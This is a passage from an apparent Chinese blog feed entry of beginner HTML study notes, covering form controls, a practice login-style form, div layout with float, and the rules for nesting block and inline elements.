class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>类似单选三者缺一不可。</strong></p><h4 id="提交按钮"><a href="#提交按钮" class="headerlink" title="提交按钮"></a>提交按钮</h4><p><code>&lt;input type=&quot;submit&quot;&gt;</code>定义了提交按钮. </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"input"</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"user"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>==value：提交数据到服务器的值（后台程序PHP使用）写按钮时一定要写上。   name：为控件命名，以备后台程序 ASP、PHP 使用==</p><h4 id="练习：-1"><a href="#练习：-1" class="headerlink" title="练习："></a>练习：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>表单<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span> <span class="comment">&lt;!-- action 中值为提交的网页 --&gt;</span><span class="comment">&lt;!-- 默认为get --&gt;</span></span><br><span class="line">admin<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"user"</span>&gt;</span></span><br><span class="line">password<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex1"</span> <span class="attr">value</span>=<span class="string">"male"</span>&gt;</span>男 <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex1"</span> <span class="attr">value</span>=<span class="string">"female"</span>&gt;</span>女  </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span>&gt;</span>中性<span class="comment">&lt;!-- name中值一样那么其分组就一样 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;input type="radio" name="sex"&gt;男</span></span><br><span class="line"><span class="comment">&lt;input type="radio" name="sex"&gt;女</span></span><br><span class="line"><span class="comment">&lt;input type="radio" name="sex"&gt;中性 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 兴趣复选框 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"xq"</span> <span class="attr">value</span>=<span class="string">"kanshu"</span>&gt;</span> 看书</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"xq"</span> <span class="attr">value</span>=<span class="string">"xuexi"</span>&gt;</span>  学习</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"xq"</span> <span class="attr">value</span>=<span class="string">"music"</span>&gt;</span>  听歌</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    城市<span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"city"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"shanghai"</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"beijing"</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/biaodan.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="HTML布局"><a href="#HTML布局" class="headerlink" title="HTML布局"></a>HTML布局</h2><p><strong>HTML 布局 - 使用<code>&lt;div&gt;</code> 元素.</strong></p><p>可以先分为头部div 底部div 和中间的div，然后逐步添加标签进行扩充，用<strong>css</strong>来设置样式。</p><p>这中间需要用到float：left等 来控制一个div中套用的div的位置。</p><ul><li>HTML中<code>&lt;div&gt;</code>元素是块级元素，它可用于组合其他 HTML元素的容器。</li><li><code>&lt;div&gt;</code> 元素的另一个常见的用途是文档布局。<code>&lt;div&gt;</code>元素经常与 <strong>CSS</strong> 一起使用，用来布局网页。</li><li><code>&lt;div&gt;</code> 元素没有特定的含义。</li></ul><p><strong>练习：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>布局<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;div style="background: yellow; width: 50px;"&gt;</span></span><br><span class="line"><span class="comment">这是个div这是个div这是个div这是个div</span></span><br><span class="line"><span class="comment">&lt;/div&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background: yellow;height: 100px;"</span>&gt;</span>导航<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background: green;width: 20%; float: left; height: 300px;"</span>&gt;</span>菜单<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">di+v</span> <span class="attr">style</span>=<span class="string">"background: red;width: 80%; float: left;height: 300px;"</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="HTML嵌套规则"><a href="#HTML嵌套规则" class="headerlink" title="HTML嵌套规则"></a>HTML嵌套规则</h2><h4 id="元素分类："><a href="#元素分类：" class="headerlink" title="元素分类："></a>元素分类：</h4><ul><li><strong>文字类块元素</strong>：p  h1~h6</li><li><strong>容器类块元素</strong>：div table tr td th form ul li ol dl dt dd</li><li><strong>行元素</strong>:不独立成行，不可以  内容决定a img input strong em del span</li><li><strong>特殊字符</strong>:br </li></ul><h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4><ul><li>块元素可以嵌套行元素 <code>&lt;div&gt;这是div &lt;a href=&quot;&quot;&gt;这是a&lt;/a&gt; &lt;/div&gt;</code></li><li>行元素可以嵌套行元素 <code>&lt;a href=&quot;&quot;&gt;这是个&lt;strong〉 a&lt;/strong&gt;</code></li><li>行元素不可以嵌套块元素</li><li>文字类抉元素不可以嵌套块元素</li><li>容器类抉元素可以嵌套块元素</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;HTML-学习&quot;&gt;&lt;a href=&quot;#HTML-学习&quot; class=&quot;headerlink&quot; title=&quot;HTML 学习&quot;&gt;&lt;/a&gt;HTML 学习&lt;/h1&gt;&lt;h2 id=&quot;HTML-基础&quot;&gt;&lt;a href=&quot;#HTML-基础&quot; class=&quot;headerlink
      
    
    </summary>
    
    
  </entry>
  
</feed>
